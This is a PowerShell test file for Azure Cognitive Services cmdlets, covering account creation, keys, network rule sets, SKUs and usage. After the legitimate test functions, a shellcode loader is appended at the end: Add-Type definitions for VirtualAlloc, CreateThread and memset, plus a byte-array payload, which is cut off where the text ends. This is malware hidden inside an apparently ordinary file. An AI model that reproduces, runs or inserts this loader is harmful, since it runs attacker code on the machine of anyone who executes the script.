














function Test-NewAzureRmCognitiveServicesAccount
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;

        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc;
        Assert-NotNull $createdAccount;
        
        $createdAccountAgain = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;
        Assert-NotNull $createdAccountAgain
        Assert-AreEqual $createdAccount.Name $createdAccountAgain.Name;
        Assert-AreEqual $createdAccount.Endpoint $createdAccountAgain.Endpoint;
        
        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-NewAzureRmCognitiveServicesAccountInvalidName
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname + ".invalid";
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;

		Assert-ThrowsContains { New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc;
        Assert-NotNull $createdAccount; } 'Failed to create Cognitive Services account.'
        
        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-NewAzureRmAllKindsOfCognitiveServicesAccounts
{
	
    $rgname = Get-CognitiveServicesManagementTestResourceName;

	$locWU = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";
	$locGBL = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "Global";

	try
	{
		New-AzResourceGroup -Name $rgname -Location 'West US';
		
		
		Test-CreateCognitiveServicesAccount $rgname 'BingSearchTest' 'Bing.Search.v7' 'S1' $locGBL
		Test-CreateCognitiveServicesAccount $rgname 'BingSpeechTest' 'SpeechServices' 'S0' $locWU
		Test-CreateCognitiveServicesAccount $rgname 'BingSpellCheckTest' 'Bing.SpellCheck.v7' 'S1' $locGBL
		Test-CreateCognitiveServicesAccount $rgname 'ComputerVisionTest' 'ComputerVision' 'S0' $locWU
		Test-CreateCognitiveServicesAccount $rgname 'ContentModeratorTest' 'ContentModerator' 'S0' $locWU
		Test-CreateCognitiveServicesAccount $rgname 'FaceTest' 'Face' 'S0' $locWU
		Test-CreateCognitiveServicesAccount $rgname 'LUISTest' 'LUIS' 'S0' $locWU
		Test-CreateCognitiveServicesAccount $rgname 'SpeakerRecognitionTest' 'SpeakerRecognition' 'S0' $locWU
		Test-CreateCognitiveServicesAccount $rgname 'TextAnalyticsTest' 'TextAnalytics' 'S1' $locWU
		Test-CreateCognitiveServicesAccount $rgname 'TextTranslationTest' 'TextTranslation' 'S1' $locGBL
	}
	finally
	{
	    
        Clean-ResourceGroup $rgname
	}
}


function Test-RemoveAzureRmCognitiveServicesAccount
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S1';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;

        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;
        Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force;
		Assert-Throws { $accountGotten = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname; }
		Assert-Null $accountGotten;	
        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-GetAzureCognitiveServiceAccount
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;

        New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;

        $account = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname;
        
        Assert-AreEqual $accountname $account.AccountName;
        Assert-AreEqual $accounttype $account.AccountType;
        Assert-AreEqual $loc $account.Location;
        Assert-AreEqual $skuname $account.Sku.Name;

        $accounts = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname;
        $numberOfAccountsInRG = ($accounts | measure).Count;
        Assert-AreEqual $accountname $accounts[0].AccountName;
        Assert-AreEqual $accounttype $accounts[0].AccountType;
        Assert-AreEqual $loc $accounts[0].Location;
        Assert-AreEqual $skuname $accounts[0].Sku.Name;

        $allAccountsInSubscription = Get-AzCognitiveServicesAccount;
        $numberOfAccountsInSubscription = ($allAccountsInSubscription | measure).Count;

        Assert-True { $numberOfAccountsInSubscription -ge $numberOfAccountsInRG }
        
        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-SetAzureRmCognitiveServicesAccount
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";
        
        New-AzResourceGroup -Name $rgname -Location $loc;
        New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;

        $originalAccount = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname;

        
        $changedAccount = Set-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -SkuName S3 -Tags @{Name = "testtag"; Value = "testval"} -Force;
        
        Assert-AreEqual $originalAccount.Location $changedAccount.Location;
        Assert-AreEqual $originalAccount.Endpoint $changedAccount.Endpoint;
        Assert-AreEqual $originalAccount.Kind $changedAccount.Kind;
        
        
        $gottenAccount = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname;

        Assert-AreEqual $originalAccount.Location $gottenAccount.Location;
        Assert-AreEqual $originalAccount.Endpoint $gottenAccount.Endpoint;
        Assert-AreEqual $originalAccount.Kind $gottenAccount.Kind;
        Assert-AreEqual 'S3' $gottenAccount.Sku.Name;
		
        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-GetAzureRmCognitiveServicesAccountKey
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;
        New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;
        
        $keys = Get-AzCognitiveServicesAccountKey -ResourceGroupName $rgname -Name $accountname;
        
        Assert-AreNotEqual $keys.Key1 $keys.Key2;

        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-NewAzureRmCognitiveServicesAccountKey
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;
    
    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;
        New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;
        
        $originalKeys = Get-AzCognitiveServicesAccountKey -ResourceGroupName $rgname -Name $accountname;
        
        $updatedKeys = New-AzCognitiveServicesAccountKey -ResourceGroupName $rgname -Name $accountname -KeyName Key1 -Force;
            
        Assert-AreNotEqual $originalKeys.Key1 $updatedKeys.Key1;
        Assert-AreEqual $originalKeys.Key2 $updatedKeys.Key2;

        
        $reupdatedKeys = New-AzCognitiveServicesAccountKey -ResourceGroupName $rgname -Name $accountname -KeyName Key2 -Force;

        Assert-AreEqual $updatedKeys.Key1 $reupdatedKeys.Key1;
        Assert-AreNotEqual $originalKeys.Key2 $reupdatedKeys.Key2;

        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}



function Test-NewAzureRmCognitiveServicesAccountWithCustomDomain
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West Central US";

        New-AzResourceGroup -Name $rgname -Location $loc;

        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -CustomSubdomainName $accountname -Force;
        Assert-NotNull $createdAccount;
        
        $createdAccountAgain = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -CustomSubdomainName $accountname -Force;
        Assert-NotNull $createdAccountAgain
        Assert-AreEqual $createdAccount.Name $createdAccountAgain.Name;
        Assert-AreEqual $createdAccount.Endpoint $createdAccountAgain.Endpoint;
        Assert-True {$createdAccount.Endpoint.Contains('cognitiveservices.azure.com')}
        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-NewAzureRmCognitiveServicesAccountWithVnet
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $vnetname = 'vnet' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West Central US";

        New-AzResourceGroup -Name $rgname -Location $loc;

		$vnet = CreateAndGetVirtualNetwork $rgname $vnetname

		$networkRuleSet = [Microsoft.Azure.Commands.Management.CognitiveServices.Models.PSNetworkRuleSet]::New()
		$networkRuleSet.AddIpRule("200.0.0.0")
		$networkRuleSet.AddVirtualNetworkRule($vnet.Subnets[0].Id)

        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -CustomSubdomainName $accountname -Force -NetworkRuleSet $networkRuleSet;
        Assert-NotNull $createdAccount;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}



function Test-SetAzureRmCognitiveServicesAccountWithCustomDomain
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West Central US";

        New-AzResourceGroup -Name $rgname -Location $loc;

        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;
        Assert-NotNull $createdAccount;
        
		$changedAccount = Set-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -CustomSubdomainName $accountname -Force;
		Assert-NotNull $changedAccount;
        Assert-True {$changedAccount.Endpoint.Contains('cognitiveservices.azure.com')}
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-SetAzureRmCognitiveServicesAccountWithVnet
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $vnetname = 'vnet' + $rgname;
        $skuname = 'S0';
        $accounttype = 'Face';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "Central US EUAP";

        New-AzResourceGroup -Name $rgname -Location $loc;
		
        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -CustomSubdomainName $accountname -Force;
        Assert-NotNull $createdAccount;

		$vnet = CreateAndGetVirtualNetwork $rgname $vnetname

		$networkRuleSet = [Microsoft.Azure.Commands.Management.CognitiveServices.Models.PSNetworkRuleSet]::New()
		$networkRuleSet.AddIpRule("200.0.0.0")
		$networkRuleSet.AddVirtualNetworkRule($vnet.Subnets[0].Id)

		$changedAccount = Set-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -NetworkRuleSet $networkRuleSet -Force;
		Assert-NotNull $changedAccount;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}






function Test-NetworkRuleSet
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $vnetname = 'vnet' + $rgname;
        $skuname = 'S0';
        $accounttype = 'Face';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "Central US EUAP";

        New-AzResourceGroup -Name $rgname -Location $loc;
		
        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -CustomSubdomainName $accountname -Force;
        Assert-NotNull $createdAccount;

		$vnet = CreateAndGetVirtualNetwork $rgname $vnetname

		$vnetid = $vnet.Subnets[0].Id
		$vnetid2 = $vnet.Subnets[1].Id

		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-Null $ruleSet

		Update-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname -DefaultAction Deny
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 0 $ruleSet.IpRules.Count
		Assert-AreEqual 0 $ruleSet.VirtualNetworkRules.Count

		Add-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -Name $accountname -VirtualNetworkResourceId $vnetid
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 0 $ruleSet.IpRules.Count
		Assert-AreEqual 1 $ruleSet.VirtualNetworkRules.Count

		Add-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -Name $accountname -VirtualNetworkResourceId $vnetid2
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 0 $ruleSet.IpRules.Count
		Assert-AreEqual 2 $ruleSet.VirtualNetworkRules.Count

		Remove-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -Name $accountname -VirtualNetworkResourceId $vnetid
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 0 $ruleSet.IpRules.Count
		Assert-AreEqual 1 $ruleSet.VirtualNetworkRules.Count

		Remove-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -Name $accountname -VirtualNetworkResourceId $vnetid2
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 0 $ruleSet.IpRules.Count
		Assert-AreEqual 0 $ruleSet.VirtualNetworkRules.Count

		Add-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -AccountName $accountname -IpAddressOrRange "16.17.18.0"
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 1 $ruleSet.IpRules.Count
		Assert-AreEqual 0 $ruleSet.VirtualNetworkRules.Count

		Add-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -AccountName $accountname -IpAddressOrRange "16.17.18.1"
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 2 $ruleSet.IpRules.Count
		Assert-AreEqual 0 $ruleSet.VirtualNetworkRules.Count

		Remove-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -Name $accountname -IpAddressOrRange "16.17.18.0"
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 1 $ruleSet.IpRules.Count
		Assert-AreEqual 0 $ruleSet.VirtualNetworkRules.Count

		Remove-AzCognitiveServicesAccountNetworkRule -ResourceGroupName $rgname -Name $accountname -IpAddressOrRange "16.17.18.1"
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Deny' $ruleSet.DefaultAction
		Assert-AreEqual 0 $ruleSet.IpRules.Count
		Assert-AreEqual 0 $ruleSet.VirtualNetworkRules.Count

		Update-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -AccountName $accountname -DefaultAction Allow -IPRule (@{IpAddress="200.0.0.0"},@{IpAddress="28.2.0.0/16"}) -VirtualNetworkRule (@{Id=$vnetid},@{Id=$vnetid2})
		$ruleSet = Get-AzCognitiveServicesAccountNetworkRuleSet -ResourceGroupName $rgname -Name $accountname
		Assert-NotNull $ruleSet
		Assert-AreEqual 'Allow' $ruleSet.DefaultAction
		Assert-AreEqual 2 $ruleSet.IpRules.Count
		Assert-AreEqual 2 $ruleSet.VirtualNetworkRules.Count

    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-GetAzureRmCognitiveServicesAccountSkus
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;
    
    try
    {
        $skus = (Get-AzCognitiveServicesAccountSkus -Type 'TextAnalytics');
        $skuNames = $skus | Select-Object -ExpandProperty Name | Sort-Object | Get-Unique
        
        $expectedSkus = "F0", "S", "S0","S1", "S2", "S3", "S4"
        Assert-AreEqualArray $expectedSkus $skuNames

		$skus = (Get-AzCognitiveServicesAccountSkus -Type 'TextAnalytics' -Location 'westus');
        $skuNames = $skus | Select-Object -ExpandProperty Name | Sort-Object | Get-Unique
        
        $expectedSkus = "F0", "S", "S0","S1", "S2", "S3", "S4"
        Assert-AreEqualArray $expectedSkus $skuNames

        $skus = (Get-AzCognitiveServicesAccountSkus -Type 'QnAMaker' -Location 'global');
        $skuNames = $skus | Select-Object -ExpandProperty Name | Sort-Object | Get-Unique
        
        Assert-AreEqual 0 $skuNames.Count

    }
    finally
    {
    }
}


function Test-GetAzureRmCognitiveServicesAccountType
{
    try
    {
        $typeName = (Get-AzCognitiveServicesAccountType -TypeName 'Face');
        Assert-AreEqual 'Face' $typeName

        $typeName = (Get-AzCognitiveServicesAccountType -TypeName 'InvalidKind');
        Assert-Null $typeName
		
		$typeNames = (Get-AzCognitiveServicesAccountType -Location 'westus');
        Assert-True {$typeNames.Contains('Face')}

		$typeNames = (Get-AzCognitiveServicesAccountType);
        Assert-True {$typeNames.Contains('Face')}

		$typeNames = (Get-AzCognitiveServicesAccountType -Location 'global');
        Assert-False {$typeNames.Contains('Face')}
        Assert-True {$typeNames.Contains('Bing.Search.v7')}
    }
    finally
    {
    }
}



function Test-PipingGetAccountToGetKey
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;
        New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;

        $keys = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname | Get-AzCognitiveServicesAccountKey;
        Assert-AreNotEqual $keys.Key1 $keys.Key2;

        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-PipingToSetAzureAccount
{
	
    $rgname = Get-CognitiveServicesManagementTestResourceName

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;
        New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;

        $account = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname;
		$account | Set-AzCognitiveServicesAccount -SkuName S3 -Force;
		
        $updatedAccount = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname;
        Assert-AreEqual 'S3' $updatedAccount.Sku.Name;

        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-MinMaxAccountName
{
	
    $rgname = Get-CognitiveServicesManagementTestResourceName

    try
    {
        
        $shortname = 'aa';
		$longname = 'testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttest';
        $skuname = 'S2';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US";

        New-AzResourceGroup -Name $rgname -Location $loc;
        $shortaccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $shortname -Type $accounttype -SkuName $skuname -Location $loc -Force;
		$longaccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $longname -Type $accounttype -SkuName $skuname -Location $loc -Force;

		Assert-AreEqual $shortname $shortaccount.AccountName;               
		Assert-AreEqual $longname $longaccount.AccountName;
        
        Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-GetWithPaging
{
	
    $rgname = Get-CognitiveServicesManagementTestResourceName
	$loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US"
	
	try
    {
		$TotalCount = 100
        
        New-AzResourceGroup -Name $rgname -Location $loc

		
		For($i = 0; $i -lt $TotalCount ; $i++)
		{
			New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name "facepaging_wu_$i" -Type 'Face' -SkuName 'S0' -Location $loc -Force;
		}

		
		For($i = 0; $i -lt $TotalCount ; $i++)
		{
			New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name "cvpaging_wu_$i" -Type 'ComputerVision' -SkuName 'S0' -Location $loc -Force;
		}

		$accounts = Get-AzCognitiveServicesAccount
		Assert-AreEqual 200 $accounts.Count

		$accounts = Get-AzCognitiveServicesAccount -ResourceGroupName $rgname
		Assert-AreEqual 200 $accounts.Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-GetUsages
{
    
    $rgname = Get-CognitiveServicesManagementTestResourceName;

    try
    {
        
        $accountname = 'csa' + $rgname;
        $skuname = 'S1';
        $accounttype = 'TextAnalytics';
        $loc = Get-Location -providerNamespace "Microsoft.CognitiveServices" -resourceType "accounts" -preferredLocation "West US"

        New-AzResourceGroup -Name $rgname -Location $loc;

        $createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;
		$usages1 = Get-AzCognitiveServicesAccountUsage -ResourceGroupName $rgname -Name $accountname
		$usages2 = Get-AzCognitiveServicesAccountUsage -InputObject $createdAccount
		$usages3 = Get-AzCognitiveServicesAccountUsage -ResourceId $createdAccount.Id

		Assert-True {$usages1.Count -gt 0}
		Assert-AreEqual 0.0 $usages1[0].CurrentValue
		Assert-True {$usages1[0].Limit -gt 0}

		Assert-AreEqual $usages1.Count $usages2.Count
		Assert-AreEqual $usages2.Count $usages3.Count

		Assert-AreEqual $usages1[0].CurrentValue $usages2[0].CurrentValue
		Assert-AreEqual $usages2[0].CurrentValue $usages3[0].CurrentValue

		Assert-AreEqual $usages1[0].Limit $usages2[0].Limit
		Assert-AreEqual $usages2[0].Limit $usages3[0].Limit
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function CreateAndGetVirtualNetwork ($resourceGroupName, $vnetName, $location = "centraluseuap")
{

	$subnet1 = New-AzVirtualNetworkSubnetConfig -Name "default" -AddressPrefix "200.0.0.0/24"
	$subnet2 = New-AzVirtualNetworkSubnetConfig -Name "subnet" -AddressPrefix "200.0.1.0/24"
	$vnet = New-AzvirtualNetwork -Name $vnetName -ResourceGroupName $resourceGroupName -Location $location -AddressPrefix "200.0.0.0/16" -Subnet $subnet1,$subnet2

	$getVnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $resourceGroupName

	return $getVnet
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x63,0x74,0xff,0xf5,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x6b,0x0f,0x03,0x6b,0x6c,0x96,0x0a,0x09,0x9a,0xd4,0xf5,0xf2,0x5a,0xb9,0x7c,0x17,0x6b,0xf9,0x1b,0x53,0xdb,0xc9,0x68,0x31,0xd7,0xa2,0x3d,0xa2,0x6c,0xc6,0xe9,0xc5,0xc5,0x6d,0xcc,0xe8,0xd6,0xde,0x2c,0x6a,0x54,0x1d,0x61,0x4c,0x65,0xee,0x74,0x8d,0xa2,0x13,0x74,0xdf,0x7b,0x5f,0x2b,0xf0,0x08,0x15,0xf0,0x7b,0x42,0xbb,0x70,0x9f,0x12,0xba,0x51,0x0e,0x29,0xe5,0x71,0xb0,0xfe,0x9d,0x3b,0xaa,0xe3,0x98,0xf2,0x41,0xd7,0x57,0x05,0x80,0x26,0x97,0xaa,0xed,0x87,0x6a,0xb2,0x2a,0x2f,0x95,0xc1,0x42,0x4c,0x28,0xd2,0x90,0x2f,0xf6,0x57,0x03,0x97,0x7d,0xcf,0xef,0x26,0x51,0x96,0x64,0x24,0x1e,0xdc,0x23,0x28,0xa1,0x31,0x58,0x54,0x2a,0xb4,0x8f,0xdd,0x68,0x93,0x0b,0x86,0x2b,0xba,0x0a,0x62,0x9d,0xc3,0x4d,0xcd,0x42,0x66,0x05,0xe3,0x97,0x1b,0x44,0x6b,0x5b,0x16,0x77,0x6b,0xf3,0x21,0x04,0x59,0x5c,0x9a,0x82,0xd1,0x15,0x04,0x54,0x16,0x0c,0xf0,0xca,0xe9,0xaf,0x01,0xc2,0x2d,0xfb,0x51,0x7c,0x84,0x84,0x39,0x7c,0x29,0x51,0xed,0x2c,0x85,0x0a,0x4e,0x9d,0x65,0xfb,0x26,0xf7,0x6a,0x24,0x56,0xf8,0xa1,0x4d,0xfd,0x02,0x21,0xcc,0x3e,0x22,0x55,0x58,0x3d,0x3c,0x95,0xc9,0xc8,0xda,0xff,0xf9,0x9c,0x75,0x97,0x60,0x85,0x0e,0x06,0x6c,0x13,0x6b,0x08,0xe6,0x90,0x8b,0xc6,0x0f,0xdc,0x9f,0xbe,0xff,0xab,0xc2,0x68,0xff,0x01,0x68,0x94,0x95,0xad,0x3b,0xc3,0x01,0xac,0x1a,0x23,0x8e,0x4f,0x49,0x38,0x07,0xda,0x32,0x56,0x68,0x0a,0xb3,0xa6,0x3e,0x40,0xb3,0xce,0xe6,